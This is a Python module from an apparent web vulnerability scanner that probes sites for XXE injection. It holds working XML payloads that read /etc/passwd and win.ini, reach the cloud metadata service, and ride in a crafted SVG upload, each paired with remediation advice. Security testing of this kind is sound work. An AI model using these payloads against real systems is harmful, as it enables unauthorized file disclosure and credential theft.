import re
from urllib.parse import urlparse

from scanner.core import Finding, Severity, ScanSession, build_curl

XXE_PAYLOADS = [
    {
        "name": "File Read (Linux)",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "indicator": r"root:[x*]:0:0:",
        "severity": Severity.CRITICAL,
        "validate": "passwd",
    },
    {
        "name": "File Read (Windows)",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><root>&xxe;</root>',
        "indicator": r"\[fonts\]",
        "severity": Severity.CRITICAL,
        "validate": "winini",
    },
    {
        "name": "SSRF via XXE",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "indicator": r"ami-id|instance-id|local-hostname",
        "severity": Severity.CRITICAL,
        "validate": None,
    },
]


def _validate_match(text: str, validate_type: str | None) -> bool:
    if validate_type == "passwd":
        lines = [l for l in text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
        return len(lines) >= 3
    if validate_type == "winini":
        return "[fonts]" in text.lower() and "[extensions]" in text.lower()
    return True


def _is_xml_endpoint(resp) -> bool:
    content_type = resp.headers.get("Content-Type", "").lower()
    if any(ct in content_type for ct in ("application/xml", "text/xml", "application/soap+xml")):
        return True
    return resp.text.lstrip()[:5] == "<?xml"



def _extract_snippet(text: str, indicator: str, context_chars: int = 80) -> str:
    match = re.search(indicator, text, re.IGNORECASE)
    if not match:
        return ""
    start = max(0, match.start() - context_chars)
    end = min(len(text), match.end() + context_chars)
    return text[start:end].replace('\n', ' ').strip()


def run(session: ScanSession) -> None:
    print("\n[*] Testing for XML External Entity (XXE) Injection...")

    _check_xml_endpoints(session)
    _check_content_type_switch(session)
    _check_file_upload_xxe(session)


def _check_xml_endpoints(session: ScanSession):
    for url in session.crawled_urls:
        resp = session.get(url)
        if not resp:
            continue

        if not _is_xml_endpoint(resp):
            continue

        baseline_text = resp.text
        parsed = urlparse(url)

        for entry in XXE_PAYLOADS:
            headers = {"Content-Type": "application/xml"}
            test_resp = session.post(
                url,
                data=entry["payload"],
                headers=headers,
            )
            if not test_resp or test_resp.status_code in (404, 403, 405):
                continue

            if re.search(entry["indicator"], test_resp.text, re.IGNORECASE):
                if re.search(entry["indicator"], baseline_text, re.IGNORECASE):
                    continue
                if not _validate_match(test_resp.text, entry.get("validate")):
                    continue

                snippet = _extract_snippet(test_resp.text, entry["indicator"])

                session.add_finding(Finding(
                    title=f"XML External Entity (XXE): {entry['name']}",
                    severity=entry["severity"],
                    description=(
                        f"The XML endpoint at {url} processes external entity declarations without "
                        f"restriction. By injecting a crafted DOCTYPE with an external ENTITY reference, "
                        f"an attacker can perform {entry['name'].lower()}. The XML parser resolved the "
                        f"external entity and included the result in the response, confirming the "
                        f"application does not disable DTD processing or external entity resolution."
                    ),
                    evidence=(
                        f"Payload Type: {entry['name']}\n"
                        f"Target URL: {url}\n"
                        f"Payload Sent: {entry['payload']}\n"
                        f"Indicator Matched: {entry['indicator']}\n"
                        f"Response Snippet: ...{snippet}...\n"
                        f"Response Status: {test_resp.status_code}"
                    ),
                    remediation=(
                        "1. Disable DTD processing entirely in the XML parser configuration.\n"
                        "2. Disable external entity resolution (SYSTEM and PUBLIC entities).\n"
                        "3. Use less complex data formats like JSON where possible.\n"
                        "4. Patch or upgrade XML processor libraries to latest versions.\n"
                        "5. Implement server-side input validation to reject DOCTYPE declarations."
                    ),
                    url=url,
                    module="xxe",
                    cwe="CWE-611",
                    confirmed=True,
                    location=f"XML parsing endpoint at {parsed.path}",
                    parameter="HTTP request body (raw XML)",
                    payload=entry["payload"],
                    request_method="POST",
                    request_headers="Content-Type: application/xml",
                    request_body=entry["payload"],
                    response_status=test_resp.status_code,
                    curl_command=build_curl("POST", url, headers=headers, data=entry["payload"]),
                    reproduction_steps=(
                        f"1. Identify the XML-accepting endpoint at: {url}\n"
                        f"2. Craft an XML payload with an external entity definition:\n"
                        f"   {entry['payload']}\n"
                        f"3. Send a POST request with Content-Type: application/xml and the payload as the body.\n"
                        f"4. Observe the response contains the resolved entity content (matched: {entry['indicator']}).\n"
                        f"5. This confirms the parser resolves external entities without restriction."
                    ),
                    developer_fix=(
                        f"File: The server-side XML processing code that handles requests to {parsed.path}.\n"
                        f"Fix: Disable external entity processing in the XML parser.\n"
                        f"Example configurations:\n"
                        f"  - Python (lxml): parser = etree.XMLParser(resolve_entities=False, no_network=True)\n"
                        f"  - Python (defusedxml): Use defusedxml.ElementTree instead of xml.etree.ElementTree\n"
                        f"  - Java: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n"
                        f"  - PHP: libxml_disable_entity_loader(true);\n"
                        f"  - .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit;"
                    ),
                    affected_component=f"XML parser at {parsed.path}",
                    references=(
                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing | "
                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html | "
                        "https://cwe.mitre.org/data/definitions/611.html"
                    ),
                    detection_method="Submitted XML payloads with external entity declarations (<!ENTITY> referencing /etc/passwd or internal URLs) via POST requests. Confirmed when file contents or internal data appear in the response, proving the XML parser resolves external entities.",
                ))
                return


def _check_content_type_switch(session: ScanSession):
    for form in session.forms:
        if form["method"] != "post":
            continue

        baseline_data = {}
        for inp in form["inputs"]:
            if inp.get("name"):
                baseline_data[inp["name"]] = inp.get("value", "test")
        baseline_resp = session.post(form["action"], data=baseline_data)
        baseline_text = baseline_resp.text if baseline_resp else ""

        source_url = form.get("source_url", form["action"])
        parsed = urlparse(form["action"])
        input_names = [i.get("name", "") for i in form["inputs"] if i.get("name")]

        for entry in XXE_PAYLOADS[:2]:
            headers = {"Content-Type": "application/xml"}
            resp = session.post(
                form["action"],
                data=entry["payload"],
                headers=headers,
            )
            if not resp or resp.status_code in (404, 403, 405, 415):
                continue

            if re.search(entry["indicator"], resp.text, re.IGNORECASE):
                if re.search(entry["indicator"], baseline_text, re.IGNORECASE):
                    continue
                if not _validate_match(resp.text, entry.get("validate")):
                    continue

                snippet = _extract_snippet(resp.text, entry["indicator"])
                data_str = "&".join(f"{k}={v}" for k, v in baseline_data.items())

                session.add_finding(Finding(
                    title=f"XXE via Content-Type Switch: {entry['name']}",
                    severity=entry["severity"],
                    description=(
                        f"The form endpoint at {form['action']} normally accepts form-encoded data "
                        f"but also processes XML when the Content-Type header is changed to "
                        f"application/xml. The XML parser resolves external entities, allowing "
                        f"{entry['name'].lower()}. This indicates the server does not validate "
                        f"the Content-Type header and blindly passes the body to an XML parser."
                    ),
                    evidence=(
                        f"Form Action: {form['action']}\n"
                        f"Original Form Fields: {', '.join(input_names)}\n"
                        f"Original Content-Type: application/x-www-form-urlencoded\n"
                        f"Switched Content-Type: application/xml\n"
                        f"Payload Type: {entry['name']}\n"
                        f"Indicator Matched: {entry['indicator']}\n"
                        f"Response Snippet: ...{snippet}...\n"
                        f"Response Status: {resp.status_code}"
                    ),
                    remediation=(
                        "1. Validate the Content-Type header on the server and reject unexpected types.\n"
                        "2. Disable DTD and external entity processing in all XML parsers.\n"
                        "3. Use a web application firewall (WAF) to block XML payloads on form endpoints.\n"
                        "4. Return HTTP 415 Unsupported Media Type for unexpected content types."
                    ),
                    url=source_url,
                    module="xxe",
                    cwe="CWE-611",
                    confirmed=True,
                    location=f"Form endpoint at {parsed.path} (Content-Type switch)",
                    parameter="HTTP request body (Content-Type switched from form-encoded to XML)",
                    payload=entry["payload"],
                    request_method="POST",
                    request_headers="Content-Type: application/xml",
                    request_body=entry["payload"],
                    response_status=resp.status_code,
                    curl_command=build_curl("POST", form["action"], headers=headers, data=entry["payload"]),
                    reproduction_steps=(
                        f"1. Navigate to the page containing the form: {source_url}\n"
                        f"2. Identify the form that POSTs to: {form['action']}\n"
                        f"3. Instead of submitting normal form data ({data_str}), change the Content-Type to application/xml.\n"
                        f"4. Send the following XML payload as the request body:\n"
                        f"   {entry['payload']}\n"
                        f"5. Observe the response contains resolved entity content (matched: {entry['indicator']}).\n"
                        f"6. The server accepted XML on a form endpoint and resolved external entities."
                    ),
                    developer_fix=(
                        f"File: The server-side handler for POST {form['action']}.\n"
                        f"Fix: Strictly validate the Content-Type header before processing the request body.\n"
                        f"Example:\n"
                        f"  - Python/Flask:\n"
                        f"    if request.content_type != 'application/x-www-form-urlencoded':\n"
                        f"        abort(415)\n"
                        f"  - Node/Express:\n"
                        f"    app.use(express.urlencoded({{ extended: true }}));  // Only parse form data\n"
                        f"  - PHP:\n"
                        f"    if ($_SERVER['CONTENT_TYPE'] !== 'application/x-www-form-urlencoded') {{\n"
                        f"        http_response_code(415); exit;\n"
                        f"    }}\n"
                        f"Also: Disable external entity processing in any XML parser as defense-in-depth."
                    ),
                    affected_component=f"POST {form['action']} - Content-Type handling",
                    references=(
                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing | "
                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html | "
                        "https://cwe.mitre.org/data/definitions/611.html"
                    ),
                    detection_method="Submitted XML payloads with external entity declarations (<!ENTITY> referencing /etc/passwd or internal URLs) via POST requests. Confirmed when file contents or internal data appear in the response, proving the XML parser resolves external entities.",
                ))
                return


def _check_file_upload_xxe(session: ScanSession):
    svg_xxe = ('<?xml version="1.0" encoding="UTF-8"?>'
               '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
               '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
               '<text x="0" y="20">&xxe;</text></svg>')

    for form in session.forms:
        has_file = any(inp.get("type") == "file" for inp in form["inputs"])
        if not has_file:
            continue

        for inp in form["inputs"]:
            if inp.get("type") != "file":
                continue

            name = inp.get("name", "file")
            files = {name: ("test.svg", svg_xxe, "image/svg+xml")}

            other_data = {}
            for other in form["inputs"]:
                other_name = other.get("name")
                if not other_name or other.get("type") == "file":
                    continue
                other_data[other_name] = other.get("value", "test")

            resp = session.post(form["action"], files=files, data=other_data)
            if not resp or resp.status_code in (404, 403):
                continue

            if re.search(r"root:[x*]:0:0:", resp.text):
                lines = [l for l in resp.text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
                if len(lines) >= 3:
                    source_url = form.get("source_url", form["action"])
                    parsed = urlparse(form["action"])
                    snippet = _extract_snippet(resp.text, r"root:[x*]:0:0:")
                    other_data_str = "&".join(f"{k}={v}" for k, v in other_data.items())

                    session.add_finding(Finding(
                        title="XXE via SVG File Upload",
                        severity=Severity.CRITICAL,
                        description=(
                            f"The file upload endpoint at {form['action']} accepts SVG files and "
                            f"processes the embedded XML without disabling external entity resolution. "
                            f"By uploading a crafted SVG containing a DOCTYPE with an external ENTITY "
                            f"referencing file:///etc/passwd, the server resolved the entity and "
                            f"returned the file contents. This allows reading arbitrary files from "
                            f"the server filesystem."
                        ),
                        evidence=(
                            f"Upload Endpoint: {form['action']}\n"
                            f"File Field: {name}\n"
                            f"Uploaded Filename: test.svg\n"
                            f"SVG Payload: {svg_xxe[:120]}...\n"
                            f"Indicator Matched: root:[x*]:0:0:\n"
                            f"Passwd Lines Found: {len(lines)}\n"
                            f"Response Snippet: ...{snippet}...\n"
                            f"Response Status: {resp.status_code}"
                        ),
                        remediation=(
                            "1. Sanitize uploaded SVG/XML files by stripping DOCTYPE declarations.\n"
                            "2. Use a library like DOMPurify (server-side) to sanitize SVG content.\n"
                            "3. Disable external entity processing in the XML parser used for SVG handling.\n"
                            "4. Validate uploaded files by content, not just extension or MIME type.\n"
                            "5. Consider converting SVGs to a rasterized format (PNG) on upload."
                        ),
                        url=source_url,
                        module="xxe",
                        cwe="CWE-611",
                        confirmed=True,
                        location=f"File upload field '{name}' at {parsed.path}",
                        parameter=name,
                        payload=svg_xxe,
                        request_method="POST",
                        request_headers="Content-Type: multipart/form-data",
                        request_body=f"File field '{name}' = test.svg (malicious SVG); {other_data_str}" if other_data_str else f"File field '{name}' = test.svg (malicious SVG)",
                        response_status=resp.status_code,
                        curl_command=build_curl("POST", form["action"], files=files, data=other_data_str if other_data_str else None),
                        reproduction_steps=(
                            f"1. Navigate to the page with the file upload form: {source_url}\n"
                            f"2. Create a malicious SVG file (test.svg) with the following content:\n"
                            f"   {svg_xxe}\n"
                            f"3. Upload the SVG file using the '{name}' file input field.\n"
                            f"4. Submit the form to: {form['action']}\n"
                            f"5. Observe the response contains the contents of /etc/passwd.\n"
                            f"6. The XML parser in the SVG processing pipeline resolved the external entity."
                        ),
                        developer_fix=(
                            f"File: The server-side upload handler for POST {form['action']} that processes "
                            f"the '{name}' file field, specifically the SVG/XML processing pipeline.\n"
                            f"Fix: Sanitize SVG uploads before processing.\n"
                            f"Example:\n"
                            f"  - Python (defusedxml):\n"
                            f"    from defusedxml import ElementTree\n"
                            f"    tree = ElementTree.parse(uploaded_file)  # Safe by default\n"
                            f"  - Python (lxml):\n"
                            f"    parser = etree.XMLParser(resolve_entities=False, no_network=True)\n"
                            f"    tree = etree.parse(uploaded_file, parser)\n"
                            f"  - Node.js:\n"
                            f"    const DOMPurify = require('dompurify');\n"
                            f"    const cleanSvg = DOMPurify.sanitize(svgContent, {{ USE_PROFILES: {{ svg: true }} }});\n"
                            f"  - Strip DOCTYPE entirely:\n"
                            f"    import re; svg_clean = re.sub(r'<!DOCTYPE[^>]*>', '', svg_content)"
                        ),
                        affected_component=f"POST {form['action']} - SVG/XML file upload processing for field '{name}'",
                        references=(
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing | "
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html | "
                            "https://cwe.mitre.org/data/definitions/611.html | "
                            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
                        ),
                        detection_method="Submitted XML payloads with external entity declarations (<!ENTITY> referencing /etc/passwd or internal URLs) via POST requests. Confirmed when file contents or internal data appear in the response, proving the XML parser resolves external entities.",
                    ))
                    return
